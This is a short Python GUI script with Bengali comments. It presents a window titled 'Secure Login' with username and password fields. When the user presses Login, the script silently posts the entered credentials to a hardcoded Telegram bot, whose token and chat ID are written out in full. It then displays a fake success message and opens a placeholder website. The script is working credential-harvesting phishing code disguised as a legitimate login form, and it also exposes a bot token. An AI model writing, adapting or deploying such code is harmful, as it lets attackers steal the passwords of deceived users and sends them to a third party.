import tkinter as tk
import requests
import webbrowser
import ttkbootstrap as ttk
from ttkbootstrap.constants import *

# টেলিগ্রাম বট কনফিগারেশন
BOT_TOKEN = "7934135059:AAFwaqZhu4VXerCCMQJSfb7tsn-9oyk01oU"  # আপনার টেলিগ্রাম বট টোকেন এখানে বসান
CHAT_ID = "6721678542"    # আপনার টেলিগ্রাম গ্রুপ বা ইউজারের চ্যাট আইডি

# টেলিগ্রামে লগইন তথ্য পাঠানোর ফাংশন
def send_telegram_message(username, password):
    message = f"🔔 *নতুন লগইন তথ্য* 🔔\n👤 *ইউজারনেম:* {username}\n🔑 *পাসওয়ার্ড:* {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=payload)

# লগইন ফাংশন
def login():
    username = entry_username.get()
    password = entry_password.get()
    
    if username and password:
        send_telegram_message(username, password)  # ইউজারের তথ্য টেলিগ্রামে পাঠানো হবে
        label_status.config(text="✅ লগইন সফল!", foreground="green")
        webbrowser.open("https://your-website.com")  # ইউজারকে ওয়েবসাইটে নিয়ে যাওয়া হবে
    else:
        label_status.config(text="❌ সব ফিল্ড পূরণ করুন!", foreground="red")

# GUI তৈরি (ttkbootstrap দিয়ে)
root = ttk.Window(themename="superhero")  # আধুনিক থিম ব্যবহার
root.title("🔐 Secure Login")
root.geometry("350x450")
root.resizable(False, False)

# লোগো
logo = ttk.Label(root, text="🔐", font=("Arial", 50))
logo.pack(pady=10)

# শিরোনাম
ttk.Label(root, text="Login to Your Account", font=("Arial", 14, "bold")).pack(pady=5)

# ইউজারনেম ইনপুট
ttk.Label(root, text="Username:", font=("Arial", 12)).pack(anchor="w", padx=30)
entry_username = ttk.Entry(root, bootstyle="info")
entry_username.pack(pady=5, padx=30, fill=X)

# পাসওয়ার্ড ইনপুট
ttk.Label(root, text="Password:", font=("Arial", 12)).pack(anchor="w", padx=30)
entry_password = ttk.Entry(root, show="*", bootstyle="info")
entry_password.pack(pady=5, padx=30, fill=X)

# লগইন বাটন
button_login = ttk.Button(root, text="Login", bootstyle="success", command=login)
button_login.pack(pady=20, padx=30, fill=X)

# স্ট্যাটাস লেবেল
label_status = ttk.Label(root, text="", font=("Arial", 10), bootstyle="danger")
label_status.pack()

# GUI চালু করা
root.mainloop()
